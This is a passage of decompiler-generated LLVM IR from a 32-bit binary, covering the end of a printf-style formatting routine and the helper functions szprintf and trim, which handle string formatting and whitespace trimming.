  %v4_80486a5.lcssa = phi i32 [ %v4_80486a525, %dec_label_pc_80486a5.preheader ], [ %v4_80486a534, %dec_label_pc_80486ae ], [ %v5_80486a2, %dec_label_pc_8048681 ]
  %v5_80486a8.lcssa = phi i32 [ %v5_80486a828, %dec_label_pc_80486a5.preheader ], [ %v5_80486a835, %dec_label_pc_80486ae ], [ %v5_80486a8, %dec_label_pc_8048681 ]
  store i32 %v4_80486a5.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486ba = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486ba = zext i8 %v2_80486ba to i32
  %v6_80486ba = or i32 %v3_80486ba, %v5_80486a8.lcssa
  store i32 %v6_80486ba, i32* %eax.global-to-local, align 4
  %v10_80486bc = icmp eq i8 %v2_80486ba, 115
  %v1_80486be = icmp eq i1 %v10_80486bc, false
  br i1 %v1_80486be, label %dec_label_pc_8048702, label %dec_label_pc_80486c0

dec_label_pc_80486c0:                             ; preds = %dec_label_pc_80486b7
  %v1_80486c3 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486cb = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486cb = load i32, i32* %v1_80486cb, align 4
  store i32 %v2_80486cb, i32* %eax.global-to-local, align 4
  %v4_80486d0 = icmp eq i32 %v2_80486cb, 0
  br i1 %v4_80486d0, label %dec_label_pc_80486e5, label %dec_label_pc_80486d6

dec_label_pc_80486d6:                             ; preds = %dec_label_pc_80486c0
  store i32 %v2_80486cb, i32* %eax.global-to-local, align 4
  %v5_80486d9 = inttoptr i32 %v2_80486cb to i8*
  br label %dec_label_pc_80486e5

dec_label_pc_80486e5:                             ; preds = %dec_label_pc_80486c0, %dec_label_pc_80486d6
  %storemerge = phi i8* [ %v5_80486d9, %dec_label_pc_80486d6 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_804fd2c.12, i32 0, i32 0), %dec_label_pc_80486c0 ]
  %v4_80486e5 = ptrtoint i8* %storemerge to i32
  store i32 %v4_80486e5, i32* %eax.global-to-local, align 4
  %v5_80486e8 = add i32 %v0_8048824, -4
  %v6_80486e8 = inttoptr i32 %v5_80486e8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e8, align 4
  %v5_80486eb = add i32 %v0_8048824, -8
  %v6_80486eb = inttoptr i32 %v5_80486eb to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486eb, align 4
  %v0_80486ee = load i32, i32* %eax.global-to-local, align 4
  %v2_80486ee = add i32 %v0_8048824, -12
  %v3_80486ee = inttoptr i32 %v2_80486ee to i32*
  store i32 %v0_80486ee, i32* %v3_80486ee, align 4
  %v5_80486ef = add i32 %v0_8048824, -16
  %v6_80486ef = inttoptr i32 %v5_80486ef to i32*
  store i32 %tmp3, i32* %v6_80486ef, align 4
  %v5_80486f2 = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_80486f2 = call i32 @prints(i32 %v4_80486e5, i8* %v5_80486f2, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_80486f2, i32* %eax.global-to-local, align 4
  %v0_80486f7 = load i32, i32* @esp, align 4
  %v1_80486f7 = add i32 %v0_80486f7, 16
  %v5_80486fa = add i32 %v6_80486f2, %stack_var_-28.154
  br label %dec_label_pc_8048836

dec_label_pc_8048702:                             ; preds = %dec_label_pc_80486b7
  store i32 %v4_80486a5.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048705 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048705 = zext i8 %v2_8048705 to i32
  %v6_8048705 = or i32 %v3_8048705, %v5_80486a8.lcssa
  store i32 %v6_8048705, i32* %eax.global-to-local, align 4
  %v10_8048707 = icmp eq i8 %v2_8048705, 100
  %v1_8048709 = icmp eq i1 %v10_8048707, false
  br i1 %v1_8048709, label %dec_label_pc_804873b, label %dec_label_pc_804870b

dec_label_pc_804870b:                             ; preds = %dec_label_pc_8048702
  %v1_804870e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048716 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048716 = load i32, i32* %v1_8048716, align 4
  store i32 %v2_8048716, i32* %eax.global-to-local, align 4
  %v1_804871b = add i32 %v0_8048824, -8
  %v2_804871b = inttoptr i32 %v1_804871b to i32*
  store i32 97, i32* %v2_804871b, align 4
  %v5_804871d = add i32 %v0_8048824, -12
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871d, align 4
  %v5_8048720 = add i32 %v0_8048824, -16
  %v6_8048720 = inttoptr i32 %v5_8048720 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048720, align 4
  %v1_8048723 = add i32 %v0_8048824, -20
  %v2_8048723 = inttoptr i32 %v1_8048723 to i32*
  store i32 1, i32* %v2_8048723, align 4
  %v1_8048725 = add i32 %v0_8048824, -24
  %v2_8048725 = inttoptr i32 %v1_8048725 to i32*
  store i32 10, i32* %v2_8048725, align 4
  %v0_8048727 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048727 = add i32 %v0_8048824, -28
  %v3_8048727 = inttoptr i32 %v2_8048727 to i32*
  store i32 %v0_8048727, i32* %v3_8048727, align 4
  %v5_8048728 = add i32 %v0_8048824, -32
  %v6_8048728 = inttoptr i32 %v5_8048728 to i32*
  store i32 %tmp3, i32* %v6_8048728, align 4
  %v1_804872b = call i32 @printi(i32 %v1_804870e)
  store i32 %v1_804872b, i32* %eax.global-to-local, align 4
  %v0_8048730 = load i32, i32* @esp, align 4
  %v1_8048730 = add i32 %v0_8048730, 32
  %v5_8048733 = add i32 %v1_804872b, %stack_var_-28.154
  br label %dec_label_pc_8048836

dec_label_pc_804873b:                             ; preds = %dec_label_pc_8048702
  store i32 %v4_80486a5.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873e = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873e = zext i8 %v2_804873e to i32
  %v6_804873e = or i32 %v3_804873e, %v5_80486a8.lcssa
  store i32 %v6_804873e, i32* %eax.global-to-local, align 4
  %v10_8048740 = icmp eq i8 %v2_804873e, 120
  %v1_8048742 = icmp eq i1 %v10_8048740, false
  br i1 %v1_8048742, label %dec_label_pc_8048774, label %dec_label_pc_8048744

dec_label_pc_8048744:                             ; preds = %dec_label_pc_804873b
  %v1_8048747 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874f = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874f = load i32, i32* %v1_804874f, align 4
  store i32 %v2_804874f, i32* %eax.global-to-local, align 4
  %v1_8048754 = add i32 %v0_8048824, -8
  %v2_8048754 = inttoptr i32 %v1_8048754 to i32*
  store i32 97, i32* %v2_8048754, align 4
  %v5_8048756 = add i32 %v0_8048824, -12
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048756, align 4
  %v5_8048759 = add i32 %v0_8048824, -16
  %v6_8048759 = inttoptr i32 %v5_8048759 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048759, align 4
  %v1_804875c = add i32 %v0_8048824, -20
  %v2_804875c = inttoptr i32 %v1_804875c to i32*
  store i32 0, i32* %v2_804875c, align 4
  %v1_804875e = add i32 %v0_8048824, -24
  %v2_804875e = inttoptr i32 %v1_804875e to i32*
  store i32 16, i32* %v2_804875e, align 4
  %v0_8048760 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048760 = add i32 %v0_8048824, -28
  %v3_8048760 = inttoptr i32 %v2_8048760 to i32*
  store i32 %v0_8048760, i32* %v3_8048760, align 4
  %v5_8048761 = add i32 %v0_8048824, -32
  %v6_8048761 = inttoptr i32 %v5_8048761 to i32*
  store i32 %tmp3, i32* %v6_8048761, align 4
  %v1_8048764 = call i32 @printi(i32 %v1_8048747)
  store i32 %v1_8048764, i32* %eax.global-to-local, align 4
  %v0_8048769 = load i32, i32* @esp, align 4
  %v1_8048769 = add i32 %v0_8048769, 32
  %v5_804876c = add i32 %v1_8048764, %stack_var_-28.154
  br label %dec_label_pc_8048836

dec_label_pc_8048774:                             ; preds = %dec_label_pc_804873b
  store i32 %v4_80486a5.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048777 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048777 = zext i8 %v2_8048777 to i32
  %v6_8048777 = or i32 %v3_8048777, %v5_80486a8.lcssa
  store i32 %v6_8048777, i32* %eax.global-to-local, align 4
  %v10_8048779 = icmp eq i8 %v2_8048777, 88
  %v1_804877b = icmp eq i1 %v10_8048779, false
  br i1 %v1_804877b, label %dec_label_pc_80487ad, label %dec_label_pc_804877d

dec_label_pc_804877d:                             ; preds = %dec_label_pc_8048774
  %v1_8048780 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048788 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048788 = load i32, i32* %v1_8048788, align 4
  store i32 %v2_8048788, i32* %eax.global-to-local, align 4
  %v1_804878d = add i32 %v0_8048824, -8
  %v2_804878d = inttoptr i32 %v1_804878d to i32*
  store i32 65, i32* %v2_804878d, align 4
  %v5_804878f = add i32 %v0_8048824, -12
  %v6_804878f = inttoptr i32 %v5_804878f to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878f, align 4
  %v5_8048792 = add i32 %v0_8048824, -16
  %v6_8048792 = inttoptr i32 %v5_8048792 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048792, align 4
  %v1_8048795 = add i32 %v0_8048824, -20
  %v2_8048795 = inttoptr i32 %v1_8048795 to i32*
  store i32 0, i32* %v2_8048795, align 4
  %v1_8048797 = add i32 %v0_8048824, -24
  %v2_8048797 = inttoptr i32 %v1_8048797 to i32*
  store i32 16, i32* %v2_8048797, align 4
  %v0_8048799 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048799 = add i32 %v0_8048824, -28
  %v3_8048799 = inttoptr i32 %v2_8048799 to i32*
  store i32 %v0_8048799, i32* %v3_8048799, align 4
  %v5_804879a = add i32 %v0_8048824, -32
  %v6_804879a = inttoptr i32 %v5_804879a to i32*
  store i32 %tmp3, i32* %v6_804879a, align 4
  %v1_804879d = call i32 @printi(i32 %v1_8048780)
  store i32 %v1_804879d, i32* %eax.global-to-local, align 4
  %v0_80487a2 = load i32, i32* @esp, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 32
  %v5_80487a5 = add i32 %v1_804879d, %stack_var_-28.154
  br label %dec_label_pc_8048836

dec_label_pc_80487ad:                             ; preds = %dec_label_pc_8048774
  store i32 %v4_80486a5.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487b0 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487b0 = zext i8 %v2_80487b0 to i32
  %v6_80487b0 = or i32 %v3_80487b0, %v5_80486a8.lcssa
  store i32 %v6_80487b0, i32* %eax.global-to-local, align 4
  %v10_80487b2 = icmp eq i8 %v2_80487b0, 117
  %v1_80487b4 = icmp eq i1 %v10_80487b2, false
  br i1 %v1_80487b4, label %dec_label_pc_80487e3, label %dec_label_pc_80487b6

dec_label_pc_80487b6:                             ; preds = %dec_label_pc_80487ad
  %v1_80487b9 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80487c1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80487c1 = load i32, i32* %v1_80487c1, align 4
  store i32 %v2_80487c1, i32* %eax.global-to-local, align 4
  %v1_80487c6 = add i32 %v0_8048824, -8
  %v2_80487c6 = inttoptr i32 %v1_80487c6 to i32*
  store i32 97, i32* %v2_80487c6, align 4
  %v5_80487c8 = add i32 %v0_8048824, -12
  %v6_80487c8 = inttoptr i32 %v5_80487c8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487c8, align 4
  %v5_80487cb = add i32 %v0_8048824, -16
  %v6_80487cb = inttoptr i32 %v5_80487cb to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487cb, align 4
  %v1_80487ce = add i32 %v0_8048824, -20
  %v2_80487ce = inttoptr i32 %v1_80487ce to i32*
  store i32 0, i32* %v2_80487ce, align 4
  %v1_80487d0 = add i32 %v0_8048824, -24
  %v2_80487d0 = inttoptr i32 %v1_80487d0 to i32*
  store i32 10, i32* %v2_80487d0, align 4
  %v0_80487d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80487d2 = add i32 %v0_8048824, -28
  %v3_80487d2 = inttoptr i32 %v2_80487d2 to i32*
  store i32 %v0_80487d2, i32* %v3_80487d2, align 4
  %v5_80487d3 = add i32 %v0_8048824, -32
  %v6_80487d3 = inttoptr i32 %v5_80487d3 to i32*
  store i32 %tmp3, i32* %v6_80487d3, align 4
  %v1_80487d6 = call i32 @printi(i32 %v1_80487b9)
  store i32 %v1_80487d6, i32* %eax.global-to-local, align 4
  %v0_80487db = load i32, i32* @esp, align 4
  %v1_80487db = add i32 %v0_80487db, 32
  %v5_80487de = add i32 %v1_80487d6, %stack_var_-28.154
  br label %dec_label_pc_8048836

dec_label_pc_80487e3:                             ; preds = %dec_label_pc_80487ad
  store i32 %v4_80486a5.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e6 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487e6 = zext i8 %v2_80487e6 to i32
  %v6_80487e6 = or i32 %v3_80487e6, %v5_80486a8.lcssa
  store i32 %v6_80487e6, i32* %eax.global-to-local, align 4
  %v10_80487e8 = icmp eq i8 %v2_80487e6, 99
  %v1_80487ea = icmp eq i1 %v10_80487e8, false
  br i1 %v1_80487ea, label %dec_label_pc_8048836, label %dec_label_pc_80487ec

dec_label_pc_80487ec:                             ; preds = %dec_label_pc_80487e3
  %v1_80487ef = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80487f7 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80487f7 = load i32, i32* %v1_80487f7, align 4
  store i32 %v2_80487f7, i32* %stack_var_-6, align 4
  %v5_8048800 = add i32 %v0_8048824, -4
  %v6_8048800 = inttoptr i32 %v5_8048800 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048800, align 4
  %v5_8048803 = add i32 %v0_8048824, -8
  %v6_8048803 = inttoptr i32 %v5_8048803 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048803, align 4
  store i32 %v2_8048806, i32* %eax.global-to-local, align 4
  %v2_8048809 = add i32 %v0_8048824, -12
  %v3_8048809 = inttoptr i32 %v2_8048809 to i32*
  store i32 %v2_8048806, i32* %v3_8048809, align 4
  %v5_804880a = add i32 %v0_8048824, -16
  %v6_804880a = inttoptr i32 %v5_804880a to i32*
  store i32 %tmp3, i32* %v6_804880a, align 4
  %v0_804880d = load i32, i32* %stack_var_-6, align 4
  %v6_804880d = call i32 @prints(i32 %v0_804880d, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804880d, i32* %eax.global-to-local, align 4
  %v0_8048812 = load i32, i32* @esp, align 4
  %v1_8048812 = add i32 %v0_8048812, 16
  %v5_8048815 = add i32 %v6_804880d, %stack_var_-28.154
  br label %dec_label_pc_8048836

dec_label_pc_804881a:                             ; preds = %dec_label_pc_804864d, %dec_label_pc_8048623
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_8048623 ], [ %v22_8048630, %dec_label_pc_804864d ]
  %v4_804881a = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_804881a, i32* %eax.global-to-local, align 4
  %v2_804881d = load i8, i8* %stack_var_8.2, align 1
  %v3_804881d = zext i8 %v2_804881d to i32
  store i32 %v3_804881d, i32* %eax.global-to-local, align 4
  %v2_8048827 = add i32 %v0_8048824, -12
  %v3_8048827 = inttoptr i32 %v2_8048827 to i32*
  store i32 %v3_804881d, i32* %v3_8048827, align 4
  %v5_8048828 = add i32 %v0_8048824, -16
  %v6_8048828 = inttoptr i32 %v5_8048828 to i32*
  store i32 %tmp3, i32* %v6_8048828, align 4
  %v2_804882b = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_804882b = call i32 @printchar(i32* %v2_804882b, i32 %stack_var_-24.151)
  store i32 %v3_804882b, i32* %eax.global-to-local, align 4
  %v0_8048830 = load i32, i32* @esp, align 4
  %v1_8048830 = add i32 %v0_8048830, 16
  %v4_8048833 = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_8048836

dec_label_pc_8048836:                             ; preds = %dec_label_pc_80487e3, %dec_label_pc_80487ec, %dec_label_pc_80487b6, %dec_label_pc_804877d, %dec_label_pc_8048744, %dec_label_pc_804870b, %dec_label_pc_80486e5, %dec_label_pc_804881a
  %v4_80486e866 = phi i32 [ %v1_8048830, %dec_label_pc_804881a ], [ %v0_8048824, %dec_label_pc_80487e3 ], [ %v1_8048812, %dec_label_pc_80487ec ], [ %v1_80487db, %dec_label_pc_80487b6 ], [ %v1_80487a2, %dec_label_pc_804877d ], [ %v1_8048769, %dec_label_pc_8048744 ], [ %v1_8048730, %dec_label_pc_804870b ], [ %v1_80486f7, %dec_label_pc_80486e5 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_804881a ], [ %stack_var_-24.151, %dec_label_pc_80487e3 ], [ %stack_var_-24.151, %dec_label_pc_80487ec ], [ %stack_var_-24.151, %dec_label_pc_80487b6 ], [ %stack_var_-24.151, %dec_label_pc_804877d ], [ %stack_var_-24.151, %dec_label_pc_8048744 ], [ %stack_var_-24.151, %dec_label_pc_804870b ], [ %v2_80486cb, %dec_label_pc_80486e5 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_804881a ], [ %stack_var_12.152, %dec_label_pc_80487e3 ], [ %v1_80487ef, %dec_label_pc_80487ec ], [ %v1_80487b9, %dec_label_pc_80487b6 ], [ %v1_8048780, %dec_label_pc_804877d ], [ %v1_8048747, %dec_label_pc_8048744 ], [ %v1_804870e, %dec_label_pc_804870b ], [ %v1_80486c3, %dec_label_pc_80486e5 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_804881a ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487e3 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487ec ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487b6 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804877d ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048744 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804870b ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486e5 ]
  %stack_var_-28.0 = phi i32 [ %v4_8048833, %dec_label_pc_804881a ], [ %stack_var_-28.154, %dec_label_pc_80487e3 ], [ %v5_8048815, %dec_label_pc_80487ec ], [ %v5_80487de, %dec_label_pc_80487b6 ], [ %v5_80487a5, %dec_label_pc_804877d ], [ %v5_804876c, %dec_label_pc_8048744 ], [ %v5_8048733, %dec_label_pc_804870b ], [ %v5_80486fa, %dec_label_pc_80486e5 ]
  %v4_8048836 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048836 = add i32 %v4_8048836, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048836 to i8*
  store i32 %v5_8048836, i32* %eax.global-to-local, align 4
  %v2_804883c = load i8, i8* %stack_var_8.4, align 1
  %v3_804883c = zext i8 %v2_804883c to i32
  %v5_804883c = and i32 %v5_8048836, -256
  %v6_804883c = or i32 %v3_804883c, %v5_804883c
  store i32 %v6_804883c, i32* %eax.global-to-local, align 4
  %v4_804883e = icmp eq i8 %v2_804883c, 0
  %v1_8048840 = icmp eq i1 %v4_804883e, false
  br i1 %v1_8048840, label %dec_label_pc_8048623, label %dec_label_pc_8048846

dec_label_pc_8048846:                             ; preds = %dec_label_pc_8048836, %dec_label_pc_8048630, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_8048630 ], [ %stack_var_-28.0, %dec_label_pc_8048836 ]
  %v4_8048846 = icmp eq i32* %arg1, null
  br i1 %v4_8048846, label %dec_label_pc_8048854, label %dec_label_pc_804884c

dec_label_pc_804884c:                             ; preds = %dec_label_pc_8048846
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_804884f = load i32, i32* %arg1, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048851 = inttoptr i32 %v2_804884f to i8*
  store i8 0, i8* %v1_8048851, align 1
  br label %dec_label_pc_8048854

dec_label_pc_8048854:                             ; preds = %dec_label_pc_8048846, %dec_label_pc_804884c
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_804883c, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048836, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_80486cb, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_80486a8.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_80486a5.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_804866f, { 1, 2, 3, 0 }
  uselistorder i8* %v22_8048630, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_8048824, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 64, 65, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 49, 3, 2, 54, 55, 1, 0, 56, 57, 58, 59, 60, 61, 62, 63, 5, 4 }
  uselistorder i32 (i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8048854, { 1, 0 }
  uselistorder label %dec_label_pc_8048836, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80486e5, { 1, 0 }
  uselistorder label %dec_label_pc_80486b7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486ae, { 1, 0 }
  uselistorder label %dec_label_pc_804866f, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
}

define i32 @szprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_8048862 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048873 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048862)
  ret i32 %v4_8048873
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp8 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_8048880 = load i32, i32* @edi, align 4
  store i32 %v0_8048880, i32* %stack_var_-8, align 4
  %v4_804888b = ptrtoint i8* %tmp8 to i32
  %v3_804889c = call i32 @_strlen(i8* %tmp8)
  %v1_80488a3 = add i32 %v3_804889c, -1
  br label %dec_label_pc_80488ac

dec_label_pc_80488a9:                             ; preds = %dec_label_pc_80488ac
  %v4_80488a9 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80488ac

dec_label_pc_80488ac:                             ; preds = %entry, %dec_label_pc_80488a9
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80488a9, %dec_label_pc_80488a9 ]
  %v6_80488af = add i32 %stack_var_-16.0, %v4_804888b
  %v1_80488b2 = inttoptr i32 %v6_80488af to i8*
  %v2_80488b2 = load i8, i8* %v1_80488b2, align 1
  %v2_80488b4 = sext i8 %v2_80488b2 to i32
  %v2_80488b7 = mul nsw i32 %v2_80488b4, 2
  %v0_80488bb = load i32, i32* inttoptr (i32 134553656 to i32*), align 8
  %v2_80488c0 = add i32 %v0_80488bb, %v2_80488b7
  %v1_80488c3 = inttoptr i32 %v2_80488c0 to i16*
  %v2_80488c3 = load i16, i16* %v1_80488c3, align 2
  %v1_80488cb = and i16 %v2_80488c3, 32
  %v2_80488cb = icmp eq i16 %v1_80488cb, 0
  %v1_80488d0 = icmp eq i1 %v2_80488cb, false
  br i1 %v1_80488d0, label %dec_label_pc_80488a9, label %dec_label_pc_80488d7.preheader

dec_label_pc_80488d7.preheader:                   ; preds = %dec_label_pc_80488ac
  %v5_80488dd19 = icmp slt i32 %v1_80488a3, %stack_var_-16.0
  br i1 %v5_80488dd19, label %dec_label_pc_8048905, label %dec_label_pc_80488df.lr.ph

dec_label_pc_80488df.lr.ph:                       ; preds = %dec_label_pc_80488d7.preheader
  %v0_80488ee.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_80488df

dec_label_pc_80488d4:                             ; preds = %dec_label_pc_80488df
  %v5_80488d4 = add i32 %stack_var_-12.0.in20, -1
  %v5_80488dd = icmp slt i32 %v5_80488d4, %stack_var_-16.0
  br i1 %v5_80488dd, label %dec_label_pc_8048905, label %dec_label_pc_80488df

dec_label_pc_80488df:                             ; preds = %dec_label_pc_80488df.lr.ph, %dec_label_pc_80488d4
  %stack_var_-12.0.in20 = phi i32 [ %v1_80488a3, %dec_label_pc_80488df.lr.ph ], [ %v5_80488d4, %dec_label_pc_80488d4 ]
  %v6_80488e2 = add i32 %stack_var_-12.0.in20, %v4_804888b
  %v1_80488e5 = inttoptr i32 %v6_80488e2 to i8*
  %v2_80488e5 = load i8, i8* %v1_80488e5, align 1
  %v2_80488e7 = sext i8 %v2_80488e5 to i32
  %v2_80488ea = mul nsw i32 %v2_80488e7, 2
  %v2_80488f3 = add i32 %v0_80488ee.pre, %v2_80488ea
  %v1_80488f6 = inttoptr i32 %v2_80488f3 to i16*
  %v2_80488f6 = load i16, i16* %v1_80488f6, align 2
  %v1_80488fe = and i16 %v2_80488f6, 32
  %v2_80488fe = icmp eq i16 %v1_80488fe, 0
  %v1_8048903 = icmp eq i1 %v2_80488fe, false
  br i1 %v1_8048903, label %dec_label_pc_80488d4, label %dec_label_pc_8048905

dec_label_pc_8048905:                             ; preds = %dec_label_pc_80488d4, %dec_label_pc_80488df, %dec_label_pc_80488d7.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80488a3, %dec_label_pc_80488d7.preheader ], [ %stack_var_-12.0.in20, %dec_label_pc_80488df ], [ %v5_80488d4, %dec_label_pc_80488d4 ]
  %v7_804892d14 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  br i1 %v7_804892d14, label %dec_label_pc_804892f, label %dec_label_pc_804890d

dec_label_pc_804890d:                             ; preds = %dec_label_pc_8048905, %dec_label_pc_804890d
  %v6_804893716 = phi i32 [ %v6_8048937, %dec_label_pc_804890d ], [ %v4_804888b, %dec_label_pc_8048905 ]
  %storemerge.in15 = phi i32 [ %v5_8048924, %dec_label_pc_804890d ], [ %stack_var_-16.0, %dec_label_pc_8048905 ]
  %v6_804891d = add i32 %storemerge.in15, %v4_804888b
  %v1_8048920 = inttoptr i32 %v6_804891d to i8*
  %v2_8048920 = load i8, i8* %v1_8048920, align 1
  %v3_8048922 = inttoptr i32 %v6_804893716 to i8*
  store i8 %v2_8048920, i8* %v3_8048922, align 1
  %v5_8048924 = add i32 %storemerge.in15, 1
  %v7_804892d = icmp sgt i32 %v5_8048924, %stack_var_-12.0.in.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  %v2_8048935 = sub i32 %v5_8048924, %stack_var_-16.0
  %v6_8048937 = add i32 %v2_8048935, %v4_804888b
  br i1 %v7_804892d, label %dec_label_pc_804892f, label %dec_label_pc_804890d

dec_label_pc_804892f:                             ; preds = %dec_label_pc_804890d, %dec_label_pc_8048905
  %v6_8048937.lcssa = phi i32 [ %v4_804888b, %dec_label_pc_8048905 ], [ %v6_8048937, %dec_label_pc_804890d ]
  %v22_8048937 = inttoptr i32 %v6_8048937.lcssa to i8*
  store i8 0, i8* %v22_8048937, align 1
  %v2_8048940 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048940, i32* @edi, align 4
  ret i32 %v6_8048937.lcssa

; uselistorder directives
